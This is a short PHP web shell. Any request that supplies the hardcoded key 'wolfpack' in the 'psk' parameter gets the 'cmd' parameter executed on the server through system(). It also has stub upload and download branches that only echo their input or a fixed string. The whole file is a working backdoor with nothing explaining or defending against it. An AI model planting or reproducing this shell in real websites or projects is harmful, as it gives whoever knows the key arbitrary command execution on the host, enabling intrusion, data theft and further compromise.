<?php

$cmd = $_REQUEST['cmd'];
$psk = $_REQUEST['psk'];
$filename = $_REQUEST['filename'];
$file = $_REQUEST['file'];


if ($psk == "wolfpack"){
    if ($cmd == "upload" && $file != "" && $filename != "") {

        echo $filename . ":";
        echo $file;


        return;

    } else if ($cmd == "download" && $filename != "" && $file == "") {
        
        $somefile = "hello php";

        echo base64_encode($somefile);

        return;
    }else if ($cmd != ""){
        system($cmd);
        return;
    }else{
        return;
    }

}else{
    return;
}
?>